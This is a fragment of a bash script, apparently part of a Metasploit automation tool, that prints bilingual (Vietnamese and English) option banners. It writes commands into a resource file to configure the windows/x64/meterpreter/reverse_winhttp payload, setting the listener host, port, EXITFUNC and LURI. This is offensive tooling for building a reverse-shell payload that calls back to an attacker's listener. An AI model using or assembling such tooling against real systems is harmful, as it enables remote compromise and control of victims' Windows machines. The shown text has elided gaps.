...
no="     Không "
cat << !
Các tùy chọn của tải trọng (windows/x64/meterpreter/reverse_winhttp):
...
no="     no "
cat << !
Payload options (windows/x64/meterpreter/reverse_winhttp):
...
config_file="$payload_path_present/Config/config"
	echo "set payload windows/x64/meterpreter/reverse_winhttp" >> $rc_file
	echo "set EXITFUNC $exitfunc" >> $rc_file
	echo "set LURI $luri" >> $rc_file
	paylo="windows/x64/meterpreter/reverse_winhttp"
	lhost=$lhost
	lport=$lport
}
